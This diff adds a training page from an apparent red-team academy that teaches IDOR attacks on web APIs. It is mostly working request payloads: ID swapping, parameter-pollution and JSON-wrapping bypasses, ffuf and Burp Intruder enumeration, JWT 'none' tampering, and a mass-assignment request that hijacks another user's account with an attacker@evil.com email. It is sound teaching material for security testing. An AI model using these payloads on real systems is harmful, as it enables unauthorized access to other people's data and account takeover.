@@ -1,0 +1,239 @@
+---
+layout: training-page
+title: "IDOR — Insecure Direct Object Reference — Red Team Academy"
+module: "Web Hacking"
+tags:
+  - idor
+  - access-control
+  - broken-access-control
+  - web-attacks
+  - api-testing
+page_key: "web-idor"
+render_with_liquid: false
+---
+
+# IDOR — Insecure Direct Object Reference
+
+IDOR (Insecure Direct Object Reference) is a broken access control vulnerability where an application uses user-controllable input to access objects directly without verifying that the requester has permission to access the specific resource. It is consistently ranked in the OWASP Top 10 and is one of the most rewarding vulnerability classes in bug bounty programs.
+
+## What to Look For
+
+```
+# Parameter names that suggest direct references to objects:
+id, user_id, account, account_id, number, order, order_id
+doc, doc_id, key, email, group, group_id, profile, profile_id
+uid, uuid, guid, ref, reference, file, filename, path
+
+# Regex + permutation approach — fuzz these patterns:
+GET /api/users/{id}
+GET /api/orders/{order_id}
+GET /documents/{doc_id}/download
+GET /invoices/{number}.pdf
+POST /api/messages   body: {"user_id": 1234}
+
+# IDs can be:
+# - Sequential integers: 1234, 1235, 1236
+# - UUIDs: 550e8400-e29b-41d4-a716-446655440000
+# - Base64 encoded: dXNlcl8xMjM0
+# - Hashed: md5/sha1 of predictable value (user@domain.com → hash)
+# - Encoded with custom scheme (decode first)
+```
+
+## Basic IDOR Testing
+
+```
+# 1. Log in as User A, capture a request referencing your own resource:
+GET /api/v1/users/1001/profile HTTP/1.1
+Cookie: session=userA_token
+
+# 2. Change the ID to another user's:
+GET /api/v1/users/1002/profile HTTP/1.1
+Cookie: session=userA_token
+
+# If you receive user 1002's data — IDOR confirmed
+
+# Burp Suite workflow:
+# - Send request to Repeater
+# - Change ID value, observe response
+# - Or use Intruder to iterate through a range: 1000-2000
+
+# Autorize Burp extension automates horizontal IDOR testing:
+# Install Autorize → intercept requests from User A → import User B's session cookie
+# Autorize replays every request with B's cookie and shows auth bypass results
+```
+
+## Common Bypass Techniques
+
+```
+# 1. Add unexpected parameters
+GET /api_v1/messages         → 401 Unauthorized
+GET /api_v1/messages?user_id=victim_uuid  → 200 OK
+
+# 2. HTTP Parameter Pollution (HPP)
+GET /api_v1/messages?user_id=ATTACKER_ID              → 401
+GET /api_v1/messages?user_id=ATTACKER_ID&user_id=VICTIM_ID  → 200
+
+GET /api_v1/messages?user_id=ATTACKER[]&user_id=VICTIM[]
+
+# 3. JSON body parameter pollution
+POST /api/get_profile
+{"user_id": LEGIT_ID, "user_id": VICTIM_ID}   # last value wins in many parsers
+
+# 4. Wrap ID in array
+{"id": 111}       → 401
+{"id": [111]}     → 200
+
+# 5. Wrap ID in JSON object
+{"id": 111}       → 401
+{"id": {"id": 111}}  → 200
+
+# 6. Old API version bypass
+/v3/users_data/1234  → 403 Forbidden
+/v1/users_data/1234  → 200 OK
+
+# 7. Ruby .json extension trick
+/user_data/2341       → 401
+/user_data/2341.json  → 200
+
+# 8. Endpoint suffix variations
+/api/user/1234        → 403
+/api/user/1234/       → 200
+/api/user/1234.0      → 200
+/api/user/01234       → 200 (leading zero)
+```
+
+## IDOR in Non-Obvious Locations
+
+```
+# File downloads — check download tokens
+GET /download?file=invoice_1234.pdf
+GET /download?file=invoice_1235.pdf   # other user's invoice
+
+# Email references
+GET /unsubscribe?email=victim@company.com
+GET /verify?token=abc123   # if token is predictable
+
+# Export/report endpoints (often missed in auth reviews)
+GET /api/export?report_id=5678
+POST /api/reports/generate   {"user_id": 9999}
+
+# Websocket messages
+{"action":"getProfile","userId":"victim_id"}
+
+# GraphQL — try querying other users' nodes
+query { user(id: "VICTIM_ID") { email password profile } }
+
+# Hidden parameters in JS files — grep JS for parameter names:
+# grep -E '"(user_id|account_id|uid|guid)"\s*:' *.js
+# Or use LinkFinder / JSParser to extract endpoints + parameters
+
+# Second-order IDOR — the reference is stored, used later
+# POST /api/settings   {"notification_email": "victim@corp.com"}
+# Server stores it, next time sends notifications to victim's email
+```
+
+## IDOR Testing with Burp Intruder
+
+```
+# 1. Capture authenticated request with your own ID:
+GET /api/users/§1001§/data HTTP/1.1
+Cookie: session=ATTACKER_SESSION
+
+# 2. Set §§ markers around the ID
+# 3. Payload type: Numbers, Range 1000-2000, Step 1
+# 4. Run attack, filter by response length difference
+# 5. IDs that return longer responses = valid user data
+
+# Automation with ffuf:
+# Generate sequential IDs:
+seq 1000 2000 > ids.txt
+ffuf -u "https://target.com/api/users/FUZZ/data" -w ids.txt \
+  -H "Cookie: session=ATTACKER_TOKEN" -fc 403,401 -mc all
+
+# Filter by response size to find valid objects:
+ffuf -u "https://target.com/api/users/FUZZ/data" -w ids.txt \
+  -H "Cookie: session=ATTACKER_TOKEN" -fs 42   # filter 42-byte "not found" responses
+```
+
+## UUID / Non-Sequential ID Bypass
+
+```
+# UUIDs look random but may be predictable or disclosed elsewhere:
+# 1. Check all API responses for UUIDs of other users
+#    (e.g., comments, posts, activity feeds often leak author UUIDs)
+# 2. Check email confirmations — links often contain UUIDs
+# 3. Check "share" links, invite links, public profiles
+# 4. JavaScript source / API documentation
+
+# Decode/manipulate encoded IDs:
+# Base64: echo "dXNlcl8xMjM0" | base64 -d → user_1234
+# JWT: jwt.io → decode payload, change user_id, re-sign with none algorithm
+# Custom hash: try md5/sha1 of email or username
+
+# IDOR with JWT:
+# 1. Decode JWT payload: {"user_id": 1001, "role": "user"}
+# 2. Change user_id to 1002
+# 3. If signature not verified: send modified token → access 1002's data
+```
+
+## Mass Assignment + IDOR
+
+```
+# Combine IDOR with mass assignment to escalate privileges:
+
+# Normal user update:
+PATCH /api/users/1001
+{"name": "New Name"}
+
+# IDOR + mass assignment attack:
+PATCH /api/users/1002           # access another user's account
+{"role": "admin", "email": "attacker@evil.com"}   # change role via mass assignment
+
+# Also try admin-only fields on your own account:
+PATCH /api/users/1001
+{"role": "admin"}    # if API doesn't filter which fields users can update
+```
+
+## Impact and Escalation
+
+```
+# Common IDOR impact:
+# - Read: view other users' PII, orders, messages, documents
+# - Write: modify other users' data, settings, billing info
+# - Delete: delete other users' accounts, content
+# - Function: perform actions as other users (transfer funds, change email/password)
+
+# Escalation chains:
+# IDOR on password reset → account takeover
+# IDOR on payment method → financial fraud
+# IDOR on admin endpoint → privilege escalation
+# IDOR on 2FA bypass → MFA circumvention
+
+# IDOR + race condition:
+# Access object during brief window when it's being created (no ownership yet assigned)
+```
+
+## Detection Checklist
+
+```
+# For every authenticated API endpoint:
+# [ ] Replace your own ID with another user's ID — does it still return data?
+# [ ] Add user_id as a GET parameter even if not in original request
+# [ ] Test HTTP Parameter Pollution
+# [ ] Test both numeric increment and UUID variants
+# [ ] Check file download endpoints
+# [ ] Check export/report generation endpoints
+# [ ] Check admin endpoints with regular user session
+# [ ] Test old API versions (/v1, /v2, /v3)
+# [ ] Look for IDs in response bodies that you can then use in other requests
+# [ ] Test state-changing endpoints (PUT/PATCH/DELETE) with other users' IDs
+```
+
+## Resources
+
+- PortSwigger IDOR labs — `portswigger.net/web-security/access-control/idor`
+- Autorize Burp extension — `github.com/Quitten/Autorize`
+- PayloadsAllTheThings IDOR — `github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References`
+- HackTricks IDOR — `book.hacktricks.xyz/pentesting-web/idor`
+- MITRE ATT&CK T1087 — Account Discovery (via IDOR) — `attack.mitre.org/techniques/T1087/`
+- OWASP A01:2021 — Broken Access Control — `owasp.org/Top10/A01_2021-Broken_Access_Control/`
